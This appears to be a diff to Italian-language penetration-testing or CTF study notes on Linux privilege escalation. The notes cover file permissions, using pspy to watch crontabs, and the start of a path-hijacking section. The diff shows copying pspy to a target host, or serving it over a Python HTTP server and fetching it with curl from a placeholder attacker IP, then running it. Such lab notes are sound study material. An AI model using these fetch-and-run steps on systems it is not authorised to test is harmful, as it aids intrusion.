@@ -278,13 +278,13 @@ di solito usato con anche
 		- `chmod 777 file.txt`
 			- dà lettura, scrittura ed esecuzione a tutti
 ###### Uso dei crontab
-posso usare pspy per controllare i crontab, lo importo nella macchina con
+posso usare `pspy` per controllare i crontab, lo importo nella macchina con
  `scp ./pspy muntrea-filemanager@192.168.14.15:/tmp/`
 
-se scp è disabilitato crea un server con
+se `scp` è disabilitato crea un server con
 `python3 -m http.server 8000`
 e poi fai 
-`c http://TUO_IP:8000/pspy64`
+`curl http://TUO_IP:8000/pspy64`
 poi lo eseguo nella macchina come 
 `./pspy64`
 ###### Path hijacking
